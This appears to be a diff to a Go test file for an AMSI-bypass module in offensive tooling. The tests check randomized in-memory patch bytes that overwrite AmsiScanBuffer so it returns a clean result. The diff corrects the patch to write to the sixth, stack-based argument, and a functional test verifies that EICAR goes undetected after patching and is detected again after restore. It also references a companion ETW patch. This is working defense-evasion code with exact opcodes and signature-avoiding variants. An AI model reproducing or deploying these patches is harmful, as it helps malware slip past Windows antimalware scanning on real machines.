@@ -239,18 +239,18 @@ func TestAMSIControl_PatchVisibleAfterEnable(t *testing.T) {
 		t.Fatalf("Enable() = %v", err)
 	}
 	defer a.Disable()
-	// The patch starts with "mov dword ptr [r9], 0" (41 C7 01 00 00 00 00)
-	// to write AMSI_RESULT_CLEAN to the out-parameter, then a register-
+	// The patch starts with "mov dword ptr [rsp+0x30], 0" (C7 44 24 30 00 00 00 00)
+	// to write AMSI_RESULT_CLEAN to the 6th argument, then a register-
 	// zeroing instruction, then ret.
-	live := make([]byte, 7)
-	for i := 0; i < 7; i++ {
+	live := make([]byte, 8)
+	for i := 0; i < 8; i++ {
 		live[i] = *(*byte)(unsafe.Add(toPtr(a.fp.addr), i))
 	}
-	if live[0] != 0x41 || live[1] != 0xC7 || live[2] != 0x01 {
-		t.Errorf("patch does not start with mov [r9],0 at 0x%X: %02X %02X %02X", a.fp.addr, live[0], live[1], live[2])
+	if live[0] != 0xC7 || live[1] != 0x44 || live[2] != 0x24 || live[3] != 0x30 {
+		t.Errorf("patch does not start with mov [rsp+0x30],0 at 0x%X: %02X %02X %02X %02X", a.fp.addr, live[0], live[1], live[2], live[3])
 	}
-	if live[3] != 0x00 || live[4] != 0x00 || live[5] != 0x00 || live[6] != 0x00 {
-		t.Errorf("mov [r9] immediate is not zero: %02X %02X %02X %02X", live[3], live[4], live[5], live[6])
+	if live[4] != 0x00 || live[5] != 0x00 || live[6] != 0x00 || live[7] != 0x00 {
+		t.Errorf("mov [rsp+0x30] immediate is not zero: %02X %02X %02X %02X", live[4], live[5], live[6], live[7])
 	}
 }
 
@@ -258,50 +258,51 @@ func TestRandomAmsiPatchBytes_Contract(t *testing.T) {
 	seen := make(map[byte]bool)
 	for i := 0; i < 1000; i++ {
 		patch := randomAmsiPatchBytes()
-		// Bytes 0..6 must be: 41 C7 01 00 00 00 00 (mov dword ptr [r9], 0)
-		if patch[0] != 0x41 || patch[1] != 0xC7 || patch[2] != 0x01 {
-			t.Fatalf("patch does not start with mov [r9],0: %02X %02X %02X", patch[0], patch[1], patch[2])
+		// Bytes 0..7 must be: C7 44 24 30 00 00 00 00
+		// (mov dword ptr [rsp+0x30], 0 — write to 6th arg)
+		if patch[0] != 0xC7 || patch[1] != 0x44 || patch[2] != 0x24 || patch[3] != 0x30 {
+			t.Fatalf("patch does not start with mov [rsp+0x30],0: %02X %02X %02X %02X", patch[0], patch[1], patch[2], patch[3])
 		}
-		if patch[3] != 0x00 || patch[4] != 0x00 || patch[5] != 0x00 || patch[6] != 0x00 {
-			t.Fatalf("mov [r9] immediate is not zero: %02X %02X %02X %02X", patch[3], patch[4], patch[5], patch[6])
+		if patch[4] != 0x00 || patch[5] != 0x00 || patch[6] != 0x00 || patch[7] != 0x00 {
+			t.Fatalf("mov [rsp+0x30] immediate is not zero: %02X %02X %02X %02X", patch[4], patch[5], patch[6], patch[7])
 		}
-		// Bytes 7..N must be a valid zeroing instruction.
-		switch patch[7] {
+		// Bytes 8..N must be a valid zeroing instruction.
+		switch patch[8] {
 		case 0x33:
-			if patch[8] != 0xC0 {
-				t.Fatalf("invalid xor eax,eax: %02X %02X", patch[7], patch[8])
+			if patch[9] != 0xC0 {
+				t.Fatalf("invalid xor eax,eax: %02X %02X", patch[8], patch[9])
 			}
 		case 0x31:
-			if patch[8] != 0xC0 {
-				t.Fatalf("invalid xor eax,eax: %02X %02X", patch[7], patch[8])
+			if patch[9] != 0xC0 {
+				t.Fatalf("invalid xor eax,eax: %02X %02X", patch[8], patch[9])
 			}
 		case 0x29:
-			if patch[8] != 0xC0 {
-				t.Fatalf("invalid sub eax,eax: %02X %02X", patch[7], patch[8])
+			if patch[9] != 0xC0 {
+				t.Fatalf("invalid sub eax,eax: %02X %02X", patch[8], patch[9])
 			}
 		case 0x48:
-			if patch[8] != 0x31 || patch[9] != 0xC0 {
-				t.Fatalf("invalid xor rax,rax: %02X %02X %02X", patch[7], patch[8], patch[9])
+			if patch[9] != 0x31 || patch[10] != 0xC0 {
+				t.Fatalf("invalid xor rax,rax: %02X %02X %02X", patch[8], patch[9], patch[10])
 			}
 		default:
-			t.Fatalf("unexpected zeroing opcode at offset 7: %02X", patch[7])
+			t.Fatalf("unexpected zeroing opcode at offset 8: %02X", patch[8])
 		}
 		retIdx := -1
-		for j := 7; j < len(patch); j++ {
+		for j := 8; j < len(patch); j++ {
 			if patch[j] == 0xC3 {
 				retIdx = j
 				break
 			}
 		}
 		zeroLen := 2
-		if patch[7] == 0x48 {
+		if patch[8] == 0x48 {
 			zeroLen = 3
 		}
-		expectedRet := 7 + zeroLen
+		expectedRet := 8 + zeroLen
 		if retIdx != expectedRet {
 			t.Fatalf("ret at index %d, want %d", retIdx, expectedRet)
 		}
-		seen[patch[7]] = true
+		seen[patch[8]] = true
 	}
 	if len(seen) < 4 {
 		t.Errorf("only %d unique zeroing variants seen in 1000 iterations: %v", len(seen), seen)
@@ -363,13 +364,23 @@ func TestRandomEtwPatchBytes_Contract(t *testing.T) {
 // amsiScan is a crash-safe wrapper around AmsiScanBuffer. AMSI calls from
 // Go test binaries can crash non-deterministically if the AMSI subsystem
 // is not fully initialized for this process context.
+//
+// AmsiScanBuffer has 6 parameters. On x64, the first 4 go in registers
+// and the last 2 go on the stack:
+//
+//	RCX  = amsiContext
+//	RDX  = buffer
+//	R8   = length
+//	R9   = contentName
+//	[RSP+28h] = amsiSession
+//	[RSP+30h] = AMSI_RESULT *result
 type amsiScanResult struct {
 	HRESULT uint32
 	Result  uint32
 	Crashed bool
 }
 
-func amsiScan(session uintptr, buf []byte, name string) (res amsiScanResult) {
+func amsiScan(ctx, session uintptr, buf []byte, name string) (res amsiScanResult) {
 	contentName, _ := syscall.UTF16PtrFromString(name)
 	func() {
 		defer func() {
@@ -378,11 +389,12 @@ func amsiScan(session uintptr, buf []byte, name string) (res amsiScanResult) {
 			}
 		}()
 		r1, _, _ := procAmsiScanBuffer.Call(
-			session,
-			uintptr(unsafe.Pointer(&buf[0])),
-			uintptr(len(buf)),
-			uintptr(unsafe.Pointer(contentName)),
-			uintptr(unsafe.Pointer(&res.Result)),
+			ctx,                             // RCX: HAMSICONTEXT
+			uintptr(unsafe.Pointer(&buf[0])), // RDX: buffer
+			uintptr(len(buf)),               // R8:  length
+			uintptr(unsafe.Pointer(contentName)), // R9:  contentName
+			session,                         // [RSP+28h]: amsiSession
+			uintptr(unsafe.Pointer(&res.Result)), // [RSP+30h]: result
 		)
 		res.HRESULT = uint32(r1)
 	}()
@@ -420,7 +432,7 @@ func TestAMSIControl_FunctionalContract(t *testing.T) {
 	eicar := []byte("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
 
 	// --- BEFORE PATCH: verify AMSI detects EICAR ---
-	pre := amsiScan(session, eicar, "eicar.txt")
+	pre := amsiScan(ctx, session, eicar, "eicar.txt")
 	if pre.Crashed {
 		t.Skip("AmsiScanBuffer crashed before patch — AMSI not functional in this process")
 	}
@@ -443,7 +455,7 @@ func TestAMSIControl_FunctionalContract(t *testing.T) {
 	defer a.Disable()
 
 	// --- AFTER PATCH: AmsiScanBuffer should return S_OK (bypass) ---
-	post := amsiScan(session, eicar, "eicar.txt")
+	post := amsiScan(ctx, session, eicar, "eicar.txt")
 	if post.Crashed {
 		t.Skip("AmsiScanBuffer crashed after patch — cannot verify bypass")
 	}
@@ -456,7 +468,7 @@ func TestAMSIControl_FunctionalContract(t *testing.T) {
 	a.Disable()
 
 	// --- AFTER RESTORE: AmsiScanBuffer should detect again ---
-	rst := amsiScan(session, eicar, "eicar.txt")
+	rst := amsiScan(ctx, session, eicar, "eicar.txt")
 	if rst.Crashed {
 		t.Skip("AmsiScanBuffer crashed after restore — cannot verify restore")
 	}
